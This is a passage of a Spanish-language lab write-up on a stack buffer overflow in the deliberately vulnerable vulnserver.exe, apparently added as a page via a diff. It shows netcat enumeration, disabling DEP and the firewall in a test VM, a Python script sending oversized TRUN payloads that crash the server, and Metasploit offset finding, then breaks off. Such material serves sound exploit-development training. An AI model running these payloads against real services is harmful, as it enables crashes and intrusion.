+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 192.168.1.100 <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>Welcome to Vulnerable Server! Enter HELP <span style="color:#66d9ef">for</span> help.
+</span></span></code></pre></div><p>Bien, pudimos conectarnos.</p>
+<p>Veamos qué comandos podemos usar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 192.168.1.100 <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>Welcome to Vulnerable Server! Enter HELP <span style="color:#66d9ef">for</span> help.
+</span></span><span style="display:flex;"><span>HELP
+</span></span><span style="display:flex;"><span>Valid Commands:
+</span></span><span style="display:flex;"><span>HELP
+</span></span><span style="display:flex;"><span>STATS <span style="color:#f92672">[</span>stat_value<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>RTIME <span style="color:#f92672">[</span>rtime_value<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>LTIME <span style="color:#f92672">[</span>ltime_value<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>SRUN <span style="color:#f92672">[</span>srun_value<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>TRUN <span style="color:#f92672">[</span>trun_value<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>GMON <span style="color:#f92672">[</span>gmon_value<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>GDOG <span style="color:#f92672">[</span>gdog_value<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>KSTET <span style="color:#f92672">[</span>kstet_value<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>GTER <span style="color:#f92672">[</span>gter_value<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>HTER <span style="color:#f92672">[</span>hter_value<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>LTER <span style="color:#f92672">[</span>lter_value<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>KSTAN <span style="color:#f92672">[</span>lstan_value<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>EXIT
+</span></span></code></pre></div><p>Son bastantes.</p>
+<p>Solo ejecutemos uno para ver que sucede:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>STATS
+</span></span><span style="display:flex;"><span>UNKNOWN COMMAND
+</span></span></code></pre></div><p>No ocurre nada.</p>
+<p>Parece que estamos contra una máquina a la que podremos aplicar <strong>Buffer Overflow</strong>.</p>
+<p>Para comprobarlo, vamos a buscar funciones del <strong>lenguaje C y C++</strong> que son vulnerables dentro del binario.</p>
+<p>Lo haremos viendo el contenido del binario con el comando <strong>strings</strong> y buscando las funciones vulnerables comunes con <strong>grep</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings vulnserver/vulnserver.exe | grep -E <span style="color:#e6db74">&#34;strcpy|sprintf|gets|scanf|memcpy|strcat&#34;</span>
+</span></span><span style="display:flex;"><span>memcpy
+</span></span><span style="display:flex;"><span>strcpy
+</span></span><span style="display:flex;"><span>_memcpy
+</span></span><span style="display:flex;"><span>_strcpy
+</span></span><span style="display:flex;"><span>__imp__memcpy
+</span></span><span style="display:flex;"><span>__imp__strcpy
+</span></span></code></pre></div><p>Excelente, es muy probable que podamos aplicar <strong>Buffer Overflow</strong>.</p>
+<p>Te diría que revisáramos los otros servicios, pero ya te digo que debemos aplicar <strong>Buffer Overflow</strong> si o sí.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="Laboratorio">Preparando Laboratorio de Pruebas</h3>
+<p>Esto será un poco largo, ya que tendremos que realizar un laboratorio de pruebas con distintas herramientas.</p>
+<p>Esto es lo que necesitaras:</p>
+<ul>
+<li>Máquina virtual <strong>Windows 7</strong>: <a href="https://windows-7-home-premium.uptodown.com/windows" target="_blank">Windows 7 Premium</a></li>
+<li>Herramienta <strong>Immunity Debugger</strong>: <a href="https://github.com/kbandla/ImmunityDebugger" target="_blank">Repositorio de kbandla: Immunity Debugger</a></li>
+<li>Script <strong>mona.py</strong>: <a href="https://github.com/corelan/mona" target="_blank">Repositorio de corelan: mona.py</a></li>
+</ul>
+<p>Primero debemos preparar la máquina virtual y después instalamos lo demás.</p>
+<h4 id="Windows7">Preparando Máquina Virtual Windows 7</h4>
+<p>La instalación es muy simple, pero lo importante es que debes recordar el usuario y contraseña que elijas.</p>
+<p>Debes escoger la red <strong>Home Network</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura6.png">
+</p>
+<p>Puede que se vea muy chica la pantalla, por lo que puedes mejorar cambiando la resolución de la pantalla:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura4.png">
+</p>
+<p>Además, algo opcional es que puedes descargar <strong>Chrome</strong> para trabajar mejor, pero eso ya es a tu criterio.</p>
+<p>Debemos desactivar el <strong>FireWall de Windows</strong> como lo muestro en la siguiente imagen:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura5.png">
+</p>
+<p>Por último, vamos a desactivar el <strong>DEP (Data Execution Prevention)</strong>, no sin antes dejar su definición:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>DEP (Data Execution Prevention)</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Es una característica de seguridad que protege contra ataques de ejecución de código en memoria. Su objetivo es evitar que un atacante ejecute código malicioso en regiones de memoria destinadas solo a datos, como la pila (stack) o el montículo (heap).</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Para desactivarlo, usa el siguiente comando en una <strong>CMD de administrador</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>bcdedit.exe /set {current} nx AlwaysOff
+</span></span></code></pre></div><p>Y reinicia la máquina.</p>
+<h4 id="Immunity">Instalando Immunity Debbuger</h4>
+<p>Antes que nada, ¿qué es <strong>Immunity Debugger</strong>?</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Immunity Debugger</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Immunity Debugger es un depurador (debugger) de Windows diseñado específicamente para análisis de vulnerabilidades, exploit development y debugging de aplicaciones en modo usuario. Fue desarrollado por Immunity Inc. y combina un depurador gráfico con un potente motor de scripting en Python.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Una vez reiniciada, vamos a descargar la última versión que viene en el repositorio que compartí arriba.</p>
+<p>Cuando lo ejecutemos, nos dirá que tenemos que tener instalado <strong>Python 2.7</strong> que no será necesario, ya que se instalara cuando terminemos de instalar el <strong>Immunity Debbuger</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura7.png">
+</p>
+<p>Tan solo debemos aceptar la licencia de uso y no hay que mover nada más:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura8.png">
+</p>
+<p>Observa que terminando, nos pedirá permiso para instalar <strong>Python 2.7</strong>, así que sigue el wizard de instalación:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura9.png">
+</p>
+<p>Y con esto, la instalación queda lista.</p>
+<h4 id="Libmona">Instalando Librería mona.py</h4>
+<p>Puedes descargar el script desde <strong>GitHub</strong> o puedes copiar el código en un archivo de texto y luego cambiar la extensión a <strong>Python</strong> desde una <strong>CMD</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura10.png">
+</p>
+<p>Una vez que lo tengas, debemos moverlo a la siguiente ruta que puede variar, aunque normalmente es la de <strong>Program Files (x86)</strong>: <code>C:/Program File o Program Files (x86)/Immunity Inc/Immunity Debbuger/PyCommands</code>.</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura11.png">
+</p>
+<p>Y con esto, nuestro laboratorio está listo, ya solo debes pasar el binario a tu <strong>máquina virtual Windows 7</strong> y podemos comenzar a hacer pruebas.</p>
+<h3 id="Vulnserver">Aplicando Buffer Overflow a Binario vulnserver.exe</h3>
+<p>Al igual que con la <strong>máquina Fawkes</strong>, estos son los pasos que yo considero, son los que se deben aplicar para realizar un <strong>Buffer Overflow</strong>:</p>
+<ul>
+<li><strong>Primero</strong>: Identificar si un archivo encontrado es un binario.</li>
+<li><strong>Segundo</strong>: Estudiar y analizar su funcionamiento.</li>
+<li><strong>Tercer</strong>: Confirmar vulnerabilidad con herramienta <strong>Immunity Debbuger</strong>.</li>
+<li><strong>Cuarto</strong>: Aplicar Fuzzing para detectar límites del binario.</li>
+<li><strong>Quinto</strong>: Identificar el <strong>offset</strong>.</li>
+<li><strong>Sexto</strong>: Identificar en qué parte de la memoria se están representando los caracteres introducidos.</li>
+<li><strong>Séptimo</strong>: Generación de <strong>Bytearrays</strong>, creación de Exploit e identificación de <strong>badchars</strong>.</li>
+<li><strong>Octavo</strong>: Creación de <strong>Shellcode malicioso</strong> y modificación de Exploit.</li>
+<li><strong>Noveno</strong>: Búsqueda de <strong>OpCode JMP ESP</strong>.</li>
+<li><strong>Décimo</strong>: Aplicación de <strong>NOPs</strong> y/o <strong>desplazamiento de pila</strong>.</li>
+<li><strong>Undécimo</strong>: Prueba y ejecución de Exploit.</li>
+</ul>
+<p>Los pasos pueden variar un poco.</p>
+<p>En este momento ya realizamos el primer, segundo y tercer paso.</p>
+<p>Por lo que vamos a comenzar con el tercer paso y de ahí en adelante.</p>
+<h4 id="Immunity2">Preparando Binario en Immunity Debbuger</h4>
+<p>Vamos a ejecutar el binario en nuestra <strong>máquina Windows 7</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura12.png">
+</p>
+<p>Puedes comprobar que se activa en el <strong>puerto 9999</strong>, conectándote desde tu máquina con <strong>netcat</strong>.</p>
+<p>Abre <strong>Immunity Debugger</strong> como administrador:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura13.png">
+</p>
+<p>Vamos a adjuntar el proceso del binario desde la pestaña <strong>File</strong>, luego seleccionamos la opción <strong>Attach</strong> y escogemos el proceso del binario:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura14.png">
+</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura15.png">
+</p>
+<p>Observa lo que pasa:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura16.png">
+</p>
+<p>Cada vez que realices este proceso, debemos iniciar el proceso:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura17.png">
+</p>
+<p>Recuerda bien este proceso, ya que lo repetiremos varias veces.</p>
+<h4 id="Cuarto">Cuarto Paso: Aplicando Fuzzing para Detectar Límites del Binario</h4>
+<p>Ahora bien, la idea es aplicar <strong>Fuzzing</strong> para descubrir en qué momento se crashea el binario.</p>
+<p>Podemos hacerlo con 2 opciones, la primera es utilizar el spiker que hice en la <strong>máquina Fawks</strong>, pero modificado, o la segunda, utilizando los scripts de un repositorio específico para explotar este binario.</p>
+<p>Primero lo haremos con mi script y luego con el spiker del repositorio.</p>
+<p>Ahora probemos con mi script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_arguments</span>():
+</span></span><span style="display:flex;"><span>        parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Script para fuzzear binarios&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--ip-addr&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Dirección IP a utilizar&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--port&#34;</span>, type<span style="color:#f92672">=</span>int, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Puerto a utilizar&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        group <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>add_mutually_exclusive_group(required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        group<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--length&#34;</span>, type<span style="color:#f92672">=</span>int, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Cantidad de A&#39;s a enviar&#34;</span>)
+</span></span><span style="display:flex;"><span>        group<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--payload&#34;</span>, type<span style="color:#f92672">=</span>str, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Payload a enviar (texto)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(ip, port, length, payload):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># Creando conexión vía TCP/IP</span>
+</span></span><span style="display:flex;"><span>                s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>                s<span style="color:#f92672">.</span>settimeout(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Conectando a </span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                s<span style="color:#f92672">.</span>connect((ip, port))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># Recibiendo banner</span>
+</span></span><span style="display:flex;"><span>                banner <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Recibiendo Banner: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span>banner<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ignore&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># Enviando payload, ya sea A&#39;s o uno del usuario</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> length:
+</span></span><span style="display:flex;"><span>                        payload_bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;TRUN /.:/&#34;</span> <span style="color:#f92672">+</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> length) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">elif</span> payload:
+</span></span><span style="display:flex;"><span>                        payload_bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;TRUN /.:/&#34;</span> <span style="color:#f92672">+</span> payload<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Payload Enviado: </span><span style="color:#e6db74">{</span>payload_bytes<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                s<span style="color:#f92672">.</span>send(payload_bytes)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># Intentar recibir respuesta (manejar error si el servidor ya crasheó</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                        response <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>                        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Respuesta del servidor: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ignore&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>timeout:
+</span></span><span style="display:flex;"><span>                        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[!] No hay respuesta, el servidor podría haber crasheado.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Manejo de errores</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>error <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Error de conexión: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Ocurrio un error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Cerrando la conexión</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">finally</span>:
+</span></span><span style="display:flex;"><span>                s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Cerrando conexión.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>        args <span style="color:#f92672">=</span> parse_arguments()
+</span></span><span style="display:flex;"><span>        exploit(args<span style="color:#f92672">.</span>ip_addr, args<span style="color:#f92672">.</span>port, args<span style="color:#f92672">.</span>length, args<span style="color:#f92672">.</span>payload)
+</span></span></code></pre></div><p>Ha sido modificado para que tramite A&rsquo;s o un payload del usuario en conjunto al <strong>comando TRUN</strong> que utiliza el binario, esto porque este comando es el que lo crashea.</p>
+<p>Probemos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 spiker.py --ip-addr 192.168.1.100 --port <span style="color:#ae81ff">9999</span> --length <span style="color:#ae81ff">5900</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Conectando a 192.168.1.100:9999...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Recibiendo Banner: 
+</span></span><span style="display:flex;"><span>------
+</span></span><span style="display:flex;"><span>Welcome to Vulnerable Server! Enter HELP <span style="color:#66d9ef">for</span> help.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Payload Enviado: b<span style="color:#e6db74">&#39;TRUN /.:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...AAA\r\n&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> No hay respuesta, el servidor podría haber crasheado.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Cerrando conexión.
+</span></span></code></pre></div><p>Y podemos ver que se crashea:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura18.png">
+</p>
+<p>Descarga el repo en tu máquina, ya que los otros scripts quizá los ocupemos:</p>
+<ul>
+<li><a href="https://github.com/shamsher404/Buffer-Overflow-tools" target="_blank">Repositorio de shamsher404: Buffer-Overflow-tools</a></li>
+</ul>
+<p>Una vez que lo tengas, utiliza el <strong>script 1-fuzzer.py</strong>. Le debes indicar la IP de tu máquina virtual:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 1-fuzzer.py
+</span></span><span style="display:flex;"><span>Enter the IP address of the target: 192.168.1.100
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">1</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">100</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">300</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">500</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">700</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">900</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">1100</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">1300</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">1500</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">1700</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">1900</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">2100</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">2300</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">2500</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">2700</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">2900</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">3100</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">3300</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">3500</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">3700</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">3900</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">4100</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">4300</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">4500</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">4700</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">4900</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">5100</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">5300</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">5500</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">5700</span> bytes 
+</span></span><span style="display:flex;"><span>Fuzzing vulnserver with <span style="color:#ae81ff">5900</span> bytes
+</span></span></code></pre></div><p>Parece que crashea a los <strong>5900 bytes</strong>.</p>
+<p>Y observa el <strong>Immunity Debugger</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura18.png">
+</p>
+<p>Nos indica que el binario se crasheo y podemos ver que se tramitaron muchas A&rsquo;s.</p>
+<h4 id="Quinto">Quinto Paso: Identificando el offset del Binario vulnserver.exe</h4>
+<p>Desde aquí, podemos identificar el <strong>offset</strong> que es el número exacto de bytes que necesitas para sobrescribir el <strong>EIP</strong>.</p>
+<p>Podemos generar un patrón de distintos caracteres para que sea más fácil identificar el <strong>offset</strong>.</p>
+<p>Para esto, vamos a usar una herramienta de <strong>Metasploit pattern_create.rb</strong> para generar <strong>5900 bytes</strong> aleatorios que mandaremos al binario para crashearlo.</p>
+<p>Los mandaremos al binario para que se crashee y luego copiaremos el <strong>EIP</strong> resultante, para que con la herramienta de <strong>Metasploit pattern_offset.rb</strong>, podamos descubrir la cantidad exacta de bytes que debemos usar para crashear el binario.</p>
+<p>Empecemos por crear los <strong>5900 bytes aleatorios</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span style="color:#ae81ff">5900</span>
+</span></span><span style="display:flex;"><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Mandamos el payload utilizando mi script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 spiker.py --ip-addr 192.168.1.100 --port <span style="color:#ae81ff">9999</span> --payload <span style="color:#e6db74">&#34;Aa0Aa1Aa2Aa3Aa4Aa5...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Conectando a 192.168.1.100:9999...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Recibiendo Banner: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Welcome to Vulnerable Server! Enter HELP for help.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
